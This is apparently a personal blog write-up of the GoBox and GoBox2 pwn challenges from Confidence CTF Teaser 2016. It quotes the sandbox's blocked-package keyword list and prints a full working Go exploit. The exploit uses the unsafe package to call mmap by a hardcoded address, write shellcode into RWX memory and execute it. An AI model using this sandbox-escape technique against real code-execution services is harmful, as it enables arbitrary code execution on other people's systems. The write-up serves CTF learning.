---
layout: post
title:  "Confidence CTF Teaser 2016 - GoBox and GoBox2 [pwn]"
date:   2016-06-01 20:12:59
tags:   ctf, pwn
excerpt_separator: <!--more-->
---

This is a writeup from Confidence CTF Teaser 2016 - GoBox and GoBox2 tasks from pwn category.

The program was a Go lang sandbox that asked for input - a valid Go program. Then it compiled and executed it. The binary was running on a server and the goal was to launch external program on it.
<!--more-->
Of course it would have been too simple to be able to just launch `os.Exec` or anything like that, so by debugging the program and reversing it I have found out that it filtered a list of keywords: `[cmd, compress, crypto, database, debug, encoing, expvar, flag, go, html, image, internal, io, log, mime, net, os, path, reflect, runtime, syscall, testing, text]`.

After some research I have found out that a library called `unsafe` can be used, which allows to use raw pointers like in C (by the way, you can use raw pointers in [C#](https://msdn.microsoft.com/en-us/library/chfa2zb8.aspx) or [Java](http://mishadoff.com/blog/java-magic-part-4-sun-dot-misc-dot-unsafe/) as well).

Of course like in modern compilers the stack was not executable, so one couldn't simply create a buffer with shellcode and call it. What I have spotted is that if I allocated some memory in Go, the `mmap` syscall was in the GOT. After some time I have found out how to call a function using raw pointer initialized with an address. Thanks to that I could call `mmap` to allocate memory with RWX permissions and so write there the shellcode and then call it.

The funny and annoying thing was that the `fmt.Println` function I have used for debugging is a generic one and so each usage of it changed the addresses in GOT, so I had to change the address from time to time.

Below is the payload I have used to get both flags (it turned out that gobox1 had some other bug that allowed it to be solved easier and this solution was working on both challenges):

```go
package main

import "fmt"
import "unsafe"

func main() {
    //var ffs = (uintptr)(0x4942a0); // syscall.mmap
    //var ffs2 = &ffs;
    // call mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)  
    //(*(*func(int, int, int, int, int, int))(unsafe.Pointer(&ffs2)))(0, 4096, 7, 34, -1, 0)

    var mmapAddr = (uintptr)(0x494330); // runtime.mmap
    var mmapPtr = &mmapAddr;

    var allocated = (*(*func(uintptr, int, int, int, int, int) (uintptr))(unsafe.Pointer(&mmapPtr)))(0, 4096, 7, 34, -1, 0)
    fmt.Printf("mmap allocated ptr=0x%x\n", allocated)

    var c = make([]byte, 1, 1)
    fmt.Println(c)

    var shellcode = []byte("\xeb\x1a\x5e\x48\x31\xc0\x48\x89\x46\x10\xb8\x3b\x00\x00\x00\x48\x8d\x3e\x48\x8d\x56\x10\x48\x8d\x76\x10\x0f\x05\xe8\xe1\xff\xff\xff\x2e\x2f\x67\x65\x74\x5f\x66\x6c\x61\x67\x00")

    for i:=0; i<len(shellcode); i++ {
        var x = unsafe.Pointer(allocated + (uintptr)(i))
        var str = (*byte)(x);
        *str = shellcode[i];
        //fmt.Println("str=%p, *str=%d\n", str, *str)
    }

    //fmt.Println(shellcode)

    var pointerWrapper = &allocated;
    fmt.Println("Launching shellcode")
    (*(*func())(unsafe.Pointer(&pointerWrapper)))()
    fmt.Println("Shellcode over")
}
```
